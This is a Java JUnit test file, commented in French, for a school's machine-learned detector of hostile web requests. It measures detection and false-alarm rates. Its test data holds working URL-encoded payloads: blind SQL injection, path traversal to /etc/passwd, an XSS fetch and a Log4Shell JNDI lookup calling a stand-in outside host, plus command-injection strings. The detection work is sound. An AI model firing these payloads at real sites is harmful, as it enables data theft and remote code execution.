package sn.ept.transdic1;

import static org.assertj.core.api.Assertions.assertThat;

import java.io.IOException;
import java.io.StringWriter;
import java.io.UncheckedIOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;
import java.util.Set;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import sn.ept.transdic1.threat.service.UrlModel;
import sn.ept.transdic1.threat.service.UrlModelConfiguration;
import sn.ept.transdic1.threat.service.UrlModelTrainer;
import sn.ept.transdic1.threat.service.WebAttackSignatures;

/**
 * Modèle appris de reconnaissance de charges utiles (S4).
 *
 * <p>Ces tests font deux choses : ils <b>mesurent</b> ce que vaut le modèle, et ils vérifient que
 * le fichier livré est bien ce que le corpus du dépôt produit. Pour le régénérer après une
 * modification du corpus ou de l'apprentissage : {@code ./mvnw test -Dtest=UrlModelTests
 * -Dmodele.update=true}.
 *
 * <p>Les mesures portent sur <b>notre</b> corpus, pas sur le trafic réel de l'école : elles disent
 * que le modèle a appris quelque chose de généralisable, elles ne disent pas le taux de fausses
 * alertes qu'il aura en service.
 */
class UrlModelTests {
  private static final Path MODEL = Path.of("src", "main", "resources", "threat", "modele-url.txt");
  private static final String NORMALS = "/threat/requetes-normales.txt";
  private static final String ATTACKS = "/threat/requetes-attaques.txt";

  /** Familles retirées de l'apprentissage : elles servent à voir ce qu'il fait d'une inconnue. */
  private static final Set<String> UNKNOWN = Set.of("MODELE", "XXE");

  /** Seuil de décision employé en service (voir {@code threat.model.threshold}). */
  private static final double THRESHOLD = 0.9;

  private record Attack(String family, String request) {}

  @Test
  @DisplayName("Le modèle livré est bien celui que le corpus produit")
  void theShippedModelIsTheOneTheCorpusProduces() throws IOException {
    var samples = new ArrayList<UrlModelTrainer.Sample>();
    normals().forEach(request -> samples.add(UrlModelTrainer.sample(request, false)));
    attacks().forEach(attack -> samples.add(UrlModelTrainer.sample(attack.request(), true)));

    UrlModel model = UrlModelTrainer.train(samples);
    var written = new StringWriter();
    UrlModelTrainer.write(
        model,
        written,
        "Appris sur le corpus de src/test/resources/threat (" + samples.size() + " requêtes).");
    String produced = written.toString().replace("\r\n", "\n");

    if (Boolean.getBoolean("modele.update")) {
      Files.createDirectories(MODEL.getParent());
      Files.writeString(MODEL, produced, StandardCharsets.UTF_8);
      return;
    }
    String committed = Files.readString(MODEL, StandardCharsets.UTF_8).replace("\r\n", "\n");
    assertThat(produced)
        .as("modele-url.txt est périmé : relancer avec -Dmodele.update=true")
        .isEqualTo(committed);
  }

  @Test
  @DisplayName("Sur des exemples jamais vus, le modèle reconnaît les attaques sans crier au loup")
  void onUnseenExamplesTheModelSeparatesAttacksFromOrdinaryRequests() {
    // Un exemple sur cinq est mis de côté avant l'apprentissage, de façon reproductible.
    var training = new ArrayList<UrlModelTrainer.Sample>();
    var heldNormals = new ArrayList<String>();
    var heldKnown = new ArrayList<String>();

    List<String> normals = normals();
    for (int i = 0; i < normals.size(); i++) {
      if (i % 5 == 0) {
        heldNormals.add(normals.get(i));
      } else {
        training.add(UrlModelTrainer.sample(normals.get(i), false));
      }
    }
    List<Attack> attacks = attacks();
    for (int i = 0; i < attacks.size(); i++) {
      Attack attack = attacks.get(i);
      if (UNKNOWN.contains(attack.family())) {
        continue; // Famille inconnue : traitée par le test suivant.
      }
      if (i % 5 == 0) {
        heldKnown.add(attack.request());
      } else {
        training.add(UrlModelTrainer.sample(attack.request(), true));
      }
    }

    UrlModel model = UrlModelTrainer.train(training);
    double falseAlarms = rate(model, heldNormals);
    double detected = rate(model, heldKnown);

    System.out.printf(
        "Modèle d'URL : %.1f %% des attaques connues repérées, %.1f %% de fausses alertes"
            + " (%d exemples mis de côté)%n",
        detected * 100, falseAlarms * 100, heldNormals.size() + heldKnown.size());

    assertThat(detected).as("attaques de familles connues repérées").isGreaterThanOrEqualTo(0.85);
    assertThat(falseAlarms).as("requêtes ordinaires prises pour des attaques").isLessThan(0.02);
  }

  @Test
  @DisplayName("Une famille d'attaque jamais apprise est tout de même repérée en partie")
  void anAttackFamilyNeverLearnedIsStillPartlyRecognised() {
    var training = new ArrayList<UrlModelTrainer.Sample>();
    normals().forEach(request -> training.add(UrlModelTrainer.sample(request, false)));
    var unknown = new ArrayList<String>();
    for (Attack attack : attacks()) {
      if (UNKNOWN.contains(attack.family())) {
        unknown.add(attack.request());
      } else {
        training.add(UrlModelTrainer.sample(attack.request(), true));
      }
    }

    UrlModel model = UrlModelTrainer.train(training);
    double detected = rate(model, unknown);
    long bySignatures =
        unknown.stream().filter(request -> WebAttackSignatures.examine(request).isAttack()).count();

    System.out.printf(
        "Familles jamais apprises (%s) : %.1f %% repérées par le modèle, %d/%d par les"
            + " signatures%n",
        String.join(", ", UNKNOWN), detected * 100, bySignatures, unknown.size());

    // C'est tout l'intérêt du modèle : voir une forme qu'aucune règle ne couvre. On n'en attend
    // pas des miracles, seulement qu'il en voie une bonne part.
    assertThat(detected).as("familles inconnues repérées").isGreaterThanOrEqualTo(0.5);
  }

  @Test
  @DisplayName("Le modèle livré laisse passer les requêtes ordinaires de l'école")
  void theShippedModelLetsOrdinarySchoolRequestsThrough() {
    UrlModel model = UrlModel.fromResource();
    List<String> ordinary =
        List.of(
            "/recherche?q=O%27Brien",
            "/recherche?q=math%C3%A9matiques%20%26%20physique",
            "/bibliotheque/ouvrage?titre=L%27art%20de%20la%20guerre",
            "/api/v1/mesures?cle=disk.usage%5B%2Fvar%5D&depuis=2026-11-10T00%3A00%3A00Z",
            "/intranet/notes?matiere=Analyse%20II%20(S3)",
            "/static/js/vendor.3a1f9c0d2e4b5a6c7d8e9f0a1b2c3d4e.js",
            "/actualites/2026/rentree-universitaire",
            "/contact?sujet=Demande%20d%27information%20%28licence%29");

    for (String request : ordinary) {
      assertThat(model.probability(request))
          .as("requête ordinaire : %s", request)
          .isLessThan(THRESHOLD);
    }
  }

  @Test
  @DisplayName("Le modèle livré repère des charges utiles qu'il n'a pas apprises par cœur")
  void theShippedModelRecognisesPayloadsItDidNotLearnByHeart() {
    UrlModel model = UrlModel.fromResource();
    List<String> payloads =
        List.of(
            "/catalogue?ref=1%27%20AND%20ASCII%28SUBSTRING%28%28SELECT%20nom%20FROM%20agents%29"
                + "%2C1%2C1%29%29%3E64--",
            "/fichiers/....//....//etc/passwd",
            "/produits?id=%3Cimg%20src%3Dx%20onerror%3Dfetch%28%27//ailleurs.example%27%29%3E",
            "/article?code=%24%7Bjndi%3Aldap%3A//ailleurs.example/x%7D");

    for (String request : payloads) {
      assertThat(model.probability(request))
          .as("charge utile : %s", request)
          .isGreaterThanOrEqualTo(THRESHOLD);
    }
  }

  @Test
  @DisplayName("Un modèle coupé ne juge jamais rien")
  void aDisabledModelNeverJudgesAnything() {
    assertThat(UrlModel.disabled().probability("/produits?id=1%27%20OR%20%271%27%3D%271"))
        .isLessThan(0.001);
  }

  @Test
  @DisplayName("Un fichier de modèle annoncé mais introuvable n'empêche pas de démarrer")
  void anAnnouncedButMissingModelFileDoesNotStopStartup() {
    var configuration = new UrlModelConfiguration();

    UrlModel fallback = configuration.urlModel(true, "chemin/qui/n/existe/pas.txt");

    // Le modèle livré prend le relais : une faute de frappe dans un chemin ne doit pas priver
    // l'école de toute sa supervision de sécurité.
    assertThat(fallback.probability("/produits?id=1%3B%7C%7Ccalc%28%29"))
        .isGreaterThanOrEqualTo(THRESHOLD);
    assertThat(configuration.urlModel(false, "").probability("/p?id=1%27%20OR%201%3D1--"))
        .isLessThan(0.001);
  }

  private double rate(UrlModel model, List<String> requests) {
    if (requests.isEmpty()) {
      return 0;
    }
    long hits = requests.stream().filter(r -> model.probability(r) >= THRESHOLD).count();
    return (double) hits / requests.size();
  }

  private static List<String> normals() {
    return corpus(NORMALS).stream().toList();
  }

  private static List<Attack> attacks() {
    var attacks = new ArrayList<Attack>();
    for (String line : corpus(ATTACKS)) {
      int tab = line.indexOf('\t');
      attacks.add(
          tab < 0
              ? new Attack("AUTRE", line)
              : new Attack(line.substring(0, tab), line.substring(tab + 1)));
    }
    return attacks;
  }

  private static List<String> corpus(String resource) {
    try (var input = UrlModelTests.class.getResourceAsStream(resource)) {
      assertThat(input).as("corpus %s", resource).isNotNull();
      var lines = new ArrayList<String>();
      for (String line : new String(input.readAllBytes(), StandardCharsets.UTF_8).split("\n", -1)) {
        String stripped = line.strip();
        if (!stripped.isEmpty() && !stripped.startsWith("#")) {
          lines.add(stripped);
        }
      }
      return lines;
    } catch (IOException e) {
      throw new UncheckedIOException(e);
    }
  }
}
